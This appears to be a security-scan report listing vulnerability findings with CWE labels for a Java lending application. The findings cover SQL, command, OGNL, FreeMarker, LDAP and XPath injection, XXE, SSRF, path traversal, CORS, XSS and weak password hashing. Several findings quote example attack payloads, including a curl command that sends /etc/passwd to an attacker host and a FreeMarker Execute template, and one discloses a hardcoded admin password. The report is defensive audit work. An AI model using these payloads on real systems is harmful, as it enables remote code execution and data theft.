extra.message: The @PathParam 'code' in rateFor() is concatenated directly into a native SQL query string executed via Statement.executeQuery(), with no parameterization. An attacker can inject arbitrary SQL via GET /underwriting/rates/{code}.

renderPacket() builds a shell command string with 'sh -c' that embeds the caller-supplied 'targetFormat' (from DocumentController.render's @FormParam) directly into the command line without sanitisation or allow-listing. An underwriter (or anyone reaching this endpoint) can inject shell metacharacters (e.g. 'pdf; curl attacker.com/$(cat /etc/passwd)') to execute arbitrary OS commands.

preview() evaluates an attacker/admin-supplied formula string directly with ognl.Ognl.getValue(). OGNL evaluation of untrusted input is a well-known remote code execution vector (as in the Struts2 OGNL CVEs) — a caller to AdminRiskController.simulate() (@Path('/admin/risk/simulate')) can supply an expression like '@java.lang.Runtime@getRuntime().exec(...)' to execute arbitrary code on the server.

previewComposedNotice() compiles the attacker-controlled 'X-Notice-Wording' HTTP header directly as a FreeMarker template source and processes it. FreeMarker templates can execute arbitrary Java via built-ins such as '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', giving remote code execution to anyone who can set this header.

renderNotice() compiles the @FormParam 'wording' directly as a FreeMarker template source and processes it, identical to the header-based variant above. This allows arbitrary FreeMarker template injection leading to remote code execution via POST /admin/outbox/notices.

importLeadsXml() parses the uploaded XML file with DocumentBuilderFactory.newInstance() without disabling DOCTYPE declarations or external entity resolution (no FEATURE_SECURE_PROCESSING / disallow-doctype-decl / external-general-entities=false). An uploaded .xml lead feed containing a DOCTYPE with an external entity can read local files or trigger SSRF/DoS (billion laughs).

cwe: CWE-611: Improper Restriction of XML External Entity Reference

extra.message: importRateOverrides() loads an uploaded .yml/.yaml file with 'new Yaml().load(content)', SnakeYAML's default (unsafe) constructor. A crafted YAML document using '!!' type tags can instantiate arbitrary Java classes during deserialization, a well-known RCE vector in SnakeYAML. Should use SafeConstructor or Yaml with a restricted LoaderOptions.

sendTestCallback() sends an outbound HTTP POST to a caller-supplied 'callbackUrl' and explicitly bypasses validateUrl() (the method that restricts webhook targets to loopback/own-host), per its own doc comment. Reachable from IntegrationController's POST /integrations/webhooks/test-callback with any role holding 'webhook.manage', this lets an attacker make the server issue requests to arbitrary internal or external hosts (SSRF), potentially reaching cloud metadata endpoints or internal-only services.

importLeadsFromUrl() issues a server-side HTTP GET to the caller-supplied 'feedUrl' with no scheme/host allow-list (unlike WebhookService.validateUrl). Reachable via POST /admin/import/from-url, this allows an admin-authenticated caller to force the server to fetch arbitrary internal URLs (e.g. cloud metadata service, internal admin APIs) and have the response content processed as a lead CSV.

deskDirectory() builds an LDAP search filter by concatenating the 'ns_desk_scope' cookie value ('office') directly into the filter string passed to DirContext.search(). A crafted cookie value such as '*)(uid=*))(|(uid=*' can inject arbitrary LDAP filter logic (LDAP injection), bypassing the intended department scoping and potentially extracting unrelated directory entries.

officerDirectory() builds an LDAP search filter by concatenating the attacker-controlled 'X-Desk-Officer' request header directly into the filter string passed to DirContext.search(), with no escaping of LDAP special characters. This allows LDAP filter injection via a crafted header value.

eligibility() concatenates the attacker-controlled 'X-Sector-Code' header directly into an XPath expression evaluated against the eligibility-policy.xml document. A value such as "'] | //*[local-name()='rule" allows XPath injection, letting an attacker alter the query to read unintended nodes of the policy document.

When the 'keepOriginal' query flag is set, the multipart upload's client-supplied file name (upload.fileName()) is resolved directly against the 'originals' directory with no normalization/containment check (unlike FileStoreService.store(), which canonicalizes and validates containment). A file name such as '../../../../etc/cron.d/evil' lets an authenticated borrower write files outside the intended upload directory.

exposeToPartner() reflects the request's 'Origin' header verbatim into 'Access-Control-Allow-Origin' and sets 'Access-Control-Allow-Credentials: true' for every path under '/applications', for any origin without an allow-list check. This lets any third-party website read credentialed (cookie-authenticated) responses from these endpoints on behalf of a logged-in victim, defeating the same-origin policy.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: partnerCard() builds an HTML response by concatenating the @PathParam 'program' directly into the body with no HTML-escaping, then returns it as text/html. A path such as /embed/partner/<script>alert(1)</script> is reflected unescaped, producing reflected XSS. This endpoint is public (unauthenticated).

legacyDigest() uses MD5 to hash credentials, and this digest is used as the actual password verifier for 'legacy' accounts in FormIdentityProvider.doAuthenticate() (line 64) and for accounts imported via UserService.importAccounts(). MD5 is cryptographically broken and unsuited for password storage (fast to brute-force, no salt), unlike the BCrypt path used for normal accounts.

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort
CWE-327: Use of a Broken Cryptographic Algorithm

extra.message: deskSignOnDigest(), used by provisionDeskAccount() to turn a branch-issued sign-on code directly into the stored password verifier, hashes it with MD5. As with legacyDigest, MD5 is unsuitable for password-equivalent credential storage and is used here as the sole authentication factor for newly provisioned desk operator accounts.

cwe: CWE-916: Use of Password Hash With Insufficient Computational Effort
CWE-327: Use of a Broken Cryptographic Algorithm

extra.message: A hardcoded plaintext password 'NorthstarBreakGlass#1' is used to create a privileged ADMIN account ('break-glass@northstar-lending.local') whenever seeding is enabled. The credential is committed to source control and disclosed to anyone with repository access; if seeding is ever enabled in a non-dev environment, this creates a well-known standing admin backdoor.

The CSRF double-submit cookie ('ns_csrf') is explicitly created with setSecure(false), so it can be transmitted over plain HTTP. If the application is ever reachable over both HTTP and HTTPS (e.g. behind a misconfigured proxy, or during a protocol-downgrade MITM), the CSRF token can be intercepted or set by a network attacker, weakening the CSRF protection it is meant to provide.
